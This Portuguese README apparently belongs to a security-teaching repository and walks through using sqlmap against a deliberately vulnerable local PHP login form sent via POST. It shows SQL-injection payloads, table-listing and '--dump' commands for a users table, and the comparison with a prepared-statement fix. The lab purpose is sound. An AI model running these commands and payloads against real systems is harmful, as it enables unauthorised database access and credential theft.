# Testando esta pasta com sqlmap (formulário de login via POST)

Diferente de `01-sql-injection/` (que expõe o parâmetro via GET na URL),
este exemplo simula uma tela de login tradicional que envia usuário/senha
via **POST** — o cenário mais comum de formulário de login real. Testado
de verdade com sqlmap 1.10.8.

## Rodar tudo de uma vez

```bash
./testar-com-sqlmap.sh
```

## Comandos manuais

1. Suba o servidor:

```bash
php -S 127.0.0.1:8901
```

2. sqlmap contra o endpoint **vulnerável**, usando `--data` em vez de
   colocar os parâmetros na URL:

```bash
sqlmap -u "http://127.0.0.1:8901/endpoint-vulneravel.php" \
  --data="usuario=admin&senha=x" \
  -p usuario --batch --level=3 --risk=2 --technique=BE --dbms=SQLite --flush-session
```

Resultado esperado — sqlmap identifica o parâmetro **POST** `usuario`
como injetável (boolean-based blind + error-based):

```
sqlmap identified the following injection point(s) with a total of 144 HTTP(s) requests:
---
Parameter: usuario (POST)
    Type: boolean-based blind
    Title: SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)
    Payload: usuario=admin' AND CASE WHEN 9831=9831 THEN 9831 ELSE JSON(CHAR(118,112,112,85)) END-- AnxB&senha=x

    Type: error-based
    Title: SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)
    Payload: usuario=admin' AND 6510=JSON_EXTRACT(...)-- NbSx&senha=x
```

3. Para extrair os dados de verdade (mesma tabela `usuarios` do exemplo
   `01-sql-injection`):

```bash
sqlmap -u "http://127.0.0.1:8901/endpoint-vulneravel.php" \
  --data="usuario=admin&senha=x" \
  -p usuario --batch --level=3 --risk=2 --technique=BE --dbms=SQLite --flush-session \
  --tables
# -> usuarios

sqlmap -u "http://127.0.0.1:8901/endpoint-vulneravel.php" \
  --data="usuario=admin&senha=x" \
  -p usuario --batch --level=3 --risk=2 --technique=BE --dbms=SQLite --flush-session \
  -T usuarios --dump
```

4. O mesmo ataque contra o endpoint **corrigido** (prepared statements):

```bash
sqlmap -u "http://127.0.0.1:8901/endpoint-corrigido.php" \
  --data="usuario=admin&senha=x" \
  -p usuario --batch --level=3 --risk=2 --technique=BE --dbms=SQLite --flush-session
```

Resultado esperado: `does not seem to be injectable` / `do not appear to
be injectable`.

## GET vs POST — o que muda no comando sqlmap

| | GET (`01-sql-injection/`) | POST (esta pasta) |
|---|---|---|
| Como o parâmetro chega no sqlmap | Direto na URL: `-u "...?usuario=admin&senha=x"` | Via `--data="usuario=admin&senha=x"`, com `-u` apontando só pro endpoint sem query string |
| sqlmap identifica o parâmetro como | `GET parameter 'usuario'` | `POST parameter 'usuario'` |
| Resto das opções (`-p`, `--level`, `--risk`, `--technique`, `--dbms`, `--flush-session`) | Igual | Igual |

Ou seja: a ÚNICA mudança real no comando é trocar a query string na URL
por `--data="..."`. sqlmap detecta sozinho que virou POST e testa os
parâmetros do corpo da mesma forma que testaria os da URL.

Veja também `A05-injecao/sqlmap-manual-parametros.md` para o significado
detalhado de cada opção, e `A05-injecao/01-sql-injection/SQLMAP.md` para
o exemplo equivalente via GET.
